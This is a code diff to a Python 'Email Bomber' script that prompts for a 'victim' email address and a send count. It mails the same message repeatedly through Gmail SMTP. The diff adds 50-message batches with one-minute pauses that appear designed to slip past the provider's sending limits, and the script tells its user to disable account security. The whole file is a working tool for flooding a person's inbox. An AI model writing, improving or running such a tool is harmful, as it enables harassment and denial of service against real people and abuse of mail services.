@@ -5,6 +5,7 @@ from string import Template
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import time
 
 print("**********Welcome to Email Bomber Type-1 **************")
 
@@ -56,20 +57,42 @@ def read_template(filename):
 # def get_host():
 #     smtp_provider = input("select your email provider\n1)GMAIL\n2)OUTLOOK")
 
-def main():
-    names, emails = get_contacts('mycontacts.txt') # read contacts
-    message_template = read_template('message.txt')
-
-    # set up the SMTP server
+def send_email(email,password,msg,batch):
+    print("System Restarted..........")
+    print("Sending batch number {}".format(batch))
     s = smtplib.SMTP(host='smtp.gmail.com', port=587)
     s.starttls()
     try:
-        s.login(MY_ADDRESS, PASSWORD)
+        s.login(email, password)
         print("Login Successfull!!!!!")
         print("------------------------")
     except Exception as e:
         print("Login failed Please disable security and enter correct email and password")
         exit(0)
+    progress = 0
+    print("sending 50 mails in batch")
+    while progress<50:
+        progress += 1
+        print("{} mail of 50 mail sent".format(progress))
+        try:
+            s.send_message(msg)
+            # print("{} message sent".format(progress))
+        except Exception as e:
+            print("{} message sending failed due to {}".format(progress,e))
+            # s.quit()
+            return
+    s.quit()
+
+    print("------------------------------------------------------------")
+    print("50 Message Successfully sent to {}".format(msg['To']))
+    del msg
+
+def main():
+    names, emails = get_contacts('mycontacts.txt') # read contacts
+    message_template = read_template('message.txt')
+
+    # set up the SMTP server
+    
     name = input("Enter the name of victim: ")
     email = input("Enter victims Email: ")
     count = int(input("Enter Number of times to send: "))
@@ -92,18 +115,19 @@ def main():
     msg.attach(MIMEText(message, 'plain'))
     
     # send the message via the server set up earlier.
-    progress = 0
-    while progress<count:
-        s.send_message(msg)
-        progress += 1
-        print("{} message out of {} message sent".format(progress,count))
-
-    print("------------------------------------------------------------")
-    print("{} Message Successfully sent to {}".format(count,msg['To']))
-    del msg
+    # progress = 0
+    count = count/50
+    new_count = count +1
+    while count>=0:
+        send_email(MY_ADDRESS,PASSWORD,msg,new_count-count)
+        count -= 1
+        print("\n\n Please wait System is restarting for Security Purpose")
+        print("\n Waiting time 1 minute \n\n\n")
+        time.sleep(60)
+    
         
     # Terminate the SMTP session and close the connection
-    s.quit()
+    
     
 if __name__ == '__main__':
     main()
